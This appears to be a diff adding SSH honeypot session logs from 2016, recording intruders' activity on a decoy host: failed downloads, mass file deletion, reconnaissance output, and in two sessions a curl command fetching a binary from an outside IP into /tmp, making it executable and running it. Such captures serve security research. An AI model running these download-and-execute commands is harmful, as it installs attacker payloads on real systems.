+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+chmod: cannot access tftp1.sh: No such file or directory
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+chmod: cannot access tftp2.sh: No such file or directory
+__________________________________
+Processing ../log/tty/20160430-201958-ec3910e1-0e.log file...
+--2016-04-30 20:19:58
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+curl: Remote file name has no length!
+chmod: cannot access bins.sh: No such file or directory
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+chmod: cannot access tftp1.sh: No such file or directory
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+chmod: cannot access tftp2.sh: No such file or directory
+__________________________________
+Processing ../log/tty/20160430-223955-eeda1063-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hnano@svr04:~$ __________________________________
+Processing ../log/tty/20160430-232010-153383da-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 23:20:10
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160430-233735-0d9f1325-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hguest@svr04:~$ __________________________________
+Processing ../log/tty/20160430-235352-d50fb9f2-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160501-003117-135689f5-0e.log file...
+--2016-05-01 00:31:17
+--  http://ftpConnecting to ftp:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'ftp' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160501-003117-94fa6077-0e.log file...
+curl: Remote file name has no length!
+__________________________________
+Processing ../log/tty/20160501-060825-e4944eb6-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-05-01 06:08:25
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160501-095310-bedf3a30-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# curl -o /tmp/udp http://23.234.25.140:15826/udp
+[4lDNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+[4hroot@svr04:~# chmod 777 /tmp/udp
+[4lchmod: cannot access /tmp/udp: No such file or directory
+[4hroot@svr04:~# /tmp/udp
+bash: /tmp/udp: command not found
+root@svr04:~# timed out waiting for input: auto-logout
+__________________________________
+Processing ../log/tty/20160501-100001-545a6fd8-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# curl -o /tmp/udp http://23.234.25.140:15826/udp
+[4lDNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+[4hroot@svr04:~# chmod 777 /tmp/udp
+[4lchmod: cannot access /tmp/udp: No such file or directory
+[4hroot@svr04:~# /tmp/udp
+bash: /tmp/udp: command not found
+root@svr04:~# [4l__________________________________
+Processing ../log/tty/20160501-101208-fa4f839b-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hguest@svr04:~$ __________________________________
+Processing ../log/tty/20160501-110812-317b9710-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hncs@svr04:~$ __________________________________
+Processing ../log/tty/20160501-193648-940a6638-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160501-193706-940a6638-1e.log file...
+Linux
+__________________________________
+Processing ../log/tty/20160501-193708-940a6638-2i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160501-195034-cf216773-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160501-195054-cf216773-1e.log file...
+Linux
+timed out waiting for input: auto-logout
+__________________________________
+Processing ../log/tty/20160501-195054-cf216773-2i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160501-195115-cf216773-3e.log file...
+             total       used       free     shared    buffers     cached
+Mem:          7880       7690        189          0        400       5171
+-/+ buffers/cache:       2118       5761
+Swap:         3675        129       3546
+timed out waiting for input: auto-logout
+__________________________________
+Processing ../log/tty/20160501-195115-cf216773-4i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160501-195136-cf216773-5e.log file...
+ PID TTY      STAT    TIME COMMAND
+   1 ?        Ss      0:07 init [2]  
+   2 ?        S<      0:00 [kthreadd]
+   3 ?        S<      0:00 [migration/0]
+   4 ?        S<      0:00 [ksoftirqd/0]
+   5 ?        S<      0:00 [watchdog/0]
+   6 ?        S<      0:17 [events/0]
+   7 ?        S<      0:00 [khelper]
+  39 ?        S<      0:00 [kblockd/0]
+  41 ?        S<      0:00 [kacpid]
+  42 ?        S<      0:00 [kacpi_notify]
+ 170 ?        S<      0:00 [kseriod]
+ 207 ?        S       0:01 [pdflush]
+ 208 ?        S       0:00 [pdflush]
+ 209 ?        S<      0:00 [kswapd0]
+ 210 ?        S<      0:00 [aio/0]
+ 748 ?        S<      0:00 [ata/0]
+ 749 ?        S<      0:00 [ata_aux]
+ 929 ?        S<      0:00 [scsi_eh_0]
+1014 ?        D<      0:03 [kjournald]
+1087 ?        S<s     0:00 udevd --daemon
+1553 ?        S<      0:00 [kpsmoused]
+2054 ?        Sl      0:01 /usr/sbin/rsyslogd -c3
+2103 tty1     Ss      0:00 /bin/login --     
+2105 tty2     Ss+     0:00 /sbin/getty 38400 tty2
+2107 tty3     Ss+     0:00 /sbin/getty 38400 tty3
+2109 tty4     Ss+     0:00 /sbin/getty 38400 tty4
+2110 tty5     Ss+     0:00 /sbin/getty 38400 tty5
+2112 tty6     Ss+     0:00 /sbin/getty 38400 tty6
+2133 ?        S<s     0:00 dhclient3 -pf /var/run/dhclient.eth0.pid -lf /var/lib
+4969 ?        Ss      0:00 /usr/sbin/sshd: root@pts/0
+5673 pts/0    Ss      0:00 -bash
+5679 pts/0    R+      0:00 ps x
+__________________________________
+Processing ../log/tty/20160501-195136-cf216773-6i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160501-195156-cf216773-7e.log file...
+processor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+__________________________________
+Processing ../log/tty/20160501-195157-cf216773-8i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160501-195217-cf216773-9e.log file...
+             total       used       free     shared    buffers     cached
+Mem:          7880       7690        189          0        400       5171
+-/+ buffers/cache:       2118       5761
+Swap:         3675        129       3546
